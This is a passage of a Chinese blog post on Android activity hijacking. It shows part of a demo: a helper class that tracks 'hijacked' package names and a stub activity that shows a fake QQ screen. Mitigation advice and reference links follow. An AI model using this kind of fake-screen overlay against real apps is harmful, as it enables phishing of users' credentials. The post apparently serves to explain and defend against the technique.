class="L8"><code><span class="pln">    </span><span class="kwd">private</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">final</span><span class="pln"> </span><span class="typ">String</span><span class="pln"> TAG </span><span class="pun">=</span><span class="pln"> </span><span class="typ">HijackingApplication</span><span class="pun">.</span><span class="kwd">class</span><span class="pun">.</span><span class="pln">getSimpleName</span><span class="pun">();</span></code></li><li class="L9"><code><span class="pln">    </span><span class="kwd">private</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="typ">List</span><span class="pun">&lt;</span><span class="typ">String</span><span class="pun">&gt;</span><span class="pln"> packageList </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">ArrayList</span><span class="pun">&lt;&gt;();</span></code></li><li class="L0"><code><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">boolean</span><span class="pln"> hasProgressBeHijacked</span><span class="pun">(</span><span class="typ">String</span><span class="pln"> packageStr</span><span class="pun">){</span></code></li><li class="L1"><code><span class="pln">        </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">packageList</span><span class="pun">.</span><span class="pln">contains</span><span class="pun">(</span><span class="pln">packageStr</span><span class="pun">)){</span></code></li><li class="L2"><code><span class="pln">            </span><span class="kwd">return</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">;</span></code></li><li class="L3"><code><span class="pln">        </span><span class="pun">}</span></code></li><li class="L4"><code><span class="pln">        </span><span class="kwd">return</span><span class="pln"> </span><span class="kwd">false</span><span class="pun">;</span></code></li><li class="L5"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L6"><code></code></li><li class="L7"><code><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> addProgressHijacked</span><span class="pun">(</span><span class="typ">String</span><span class="pln"> packageStr</span><span class="pun">){</span></code></li><li class="L8"><code><span class="pln">        packageList</span><span class="pun">.</span><span class="pln">add</span><span class="pun">(</span><span class="pln">packageStr</span><span class="pun">);</span></code></li><li class="L9"><code><span class="pln">        </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="pln">TAG</span><span class="pun">,</span><span class="str">"packageList.size() = "</span><span class="pun">+</span><span class="pln"> packageList</span><span class="pun">.</span><span class="pln">size</span><span class="pun">());</span></code></li><li class="L0"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L1"><code></code></li><li class="L2"><code><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> clearProgressHijacked</span><span class="pun">(){</span></code></li><li class="L3"><code><span class="pln">        packageList</span><span class="pun">.</span><span class="pln">clear</span><span class="pun">();</span></code></li><li class="L4"><code><span class="pln">        </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="pln">TAG</span><span class="pun">,</span><span class="str">"packageList.size() = "</span><span class="pun">+</span><span class="pln"> packageList</span><span class="pun">.</span><span class="pln">size</span><span class="pun">());</span></code></li><li class="L5"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L6"><code></code></li><li class="L7"><code><span class="pun">}</span></code></li></ol></pre><p data-anchor-id="9i4m"><strong>QQActivity</strong></p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="wz51"><ol class="linenums"><li class="L0"><code><span class="kwd">public</span><span class="pln"> </span><span class="kwd">class</span><span class="pln"> </span><span class="typ">QQActivity</span><span class="pln"> </span><span class="kwd">extends</span><span class="pln"> </span><span class="typ">Activity</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L1"><code></code></li><li class="L2"><code><span class="pln">    </span><span class="lit">@Override</span></code></li><li class="L3"><code><span class="pln">    </span><span class="kwd">protected</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> onCreate</span><span class="pun">(</span><span class="lit">@Nullable</span><span class="pln"> </span><span class="typ">Bundle</span><span class="pln"> savedInstanceState</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L4"><code><span class="pln">        </span><span class="kwd">super</span><span class="pun">.</span><span class="pln">onCreate</span><span class="pun">(</span><span class="pln">savedInstanceState</span><span class="pun">);</span></code></li><li class="L5"><code><span class="pln">        setContentView</span><span class="pun">(</span><span class="pln">R</span><span class="pun">.</span><span class="pln">layout</span><span class="pun">.</span><span class="pln">qq_layout</span><span class="pun">);</span></code></li><li class="L6"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L7"><code><span class="pun">}</span></code></li></ol></pre><div class="md-section-divider"></div><h2 data-anchor-id="xcal" id="修复方法">修复方法</h2><ul data-anchor-id="mjj6">
<li>应用程序自身通过获取栈顶activity，判断系统当前运行的程序，一旦发现应用切换，给与用户提示以防范钓鱼程序的欺诈。</li>
<li>获取栈顶activity，当设计敏感activity切换时，判断当前是否仍留在源程序，若不是则通过Toast给与提示。</li>
<li>使用html5架构或android+html混合开发，实现登陆支付等关键页面，降低被劫持的风险。 </li>
</ul><div class="md-section-divider"></div><h2 data-anchor-id="uytn" id="其他">其他</h2><p data-anchor-id="dwbh"><a href="https://www.jianshu.com/p/c73b2a23c3c9" target="_blank">https://www.jianshu.com/p/c73b2a23c3c9</a> <br>
<a href="https://github.com/abigbread/Hijack" target="_blank">https://github.com/abigbread/Hijack</a></p></div>
</body>
</html>